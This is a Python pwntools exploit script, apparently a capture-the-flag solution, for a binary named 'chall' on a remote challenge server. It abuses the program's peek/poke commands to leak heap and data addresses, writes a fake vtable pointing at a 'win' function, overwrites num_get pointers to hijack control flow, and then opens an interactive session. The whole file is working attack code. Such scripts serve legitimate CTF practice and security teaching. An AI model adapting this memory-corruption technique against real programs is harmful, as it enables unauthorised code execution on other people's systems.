#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 12348)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            b *(main+121)
            set logging on
            continue 
            grep tbtltbtltbtltbtltbtltbtltbtltbtl
            vmmap
            telescope *(void**)($rsp+0x10) -l 0x100
            telescope &data_start -l 0x100
            b win
            continue
            telescope &data_start -l 0x100
            continue 
        ''')
    return p

def poke(p, x, y):
    p.sendlineafter(b':\n', 'poke {} {}'.format(x, y).encode())

def peek(p, x):
    p.sendlineafter(b':\n', 'peek {}'.format(x).encode())
    return int(p.recvline())

def peekq(p, x):
    b = [(peek(p, x+i)+256)%256 for i in range(8)]
    return unpack(bytes(b))

def pokeq(p, x, y):
    for i, c in enumerate(pack(y)):
        poke(p, x+i, c)

p = conn()
str_payload = b'tbtltbtltbtltbtltbtltbtltbtltbtl'
p.sendlineafter(b':', str_payload)

# Find the address of the payload
heap_offset = 0x58
heap_addr = peekq(p, heap_offset)
str_addr = heap_addr + 0x11e80
print('str_addr          ={:016x}'.format(str_addr))
    
# Find the data_start address
help_start_offset = 0xb8
help_addr = peekq(p, help_start_offset)
data_start_addr = help_addr-0x368
data_start_offset = data_start_addr-str_addr
print('data_start_addr   ={:016x}'.format(data_start_addr))

# Build a dummy vtable
win_addr = data_start_addr - 0x2047e6
ptr1 = data_start_addr + 0x400
ptr1_offset = data_start_offset + 0x400
for i in range(0x4):
    pokeq(p, ptr1_offset+i*8, win_addr)

# Overwrite num_get pointers to the dummy vtable
t_numget_offset = data_start_offset + 0x120 
ptr2 = data_start_addr + 0x480
ptr2_offset = data_start_offset+ 0x480
pokeq(p, ptr2_offset, ptr1)
pokeq(p, t_numget_offset, ptr2)

# Trigger the win function
p.sendlineafter(b':', b'peek 0')

p.interactive()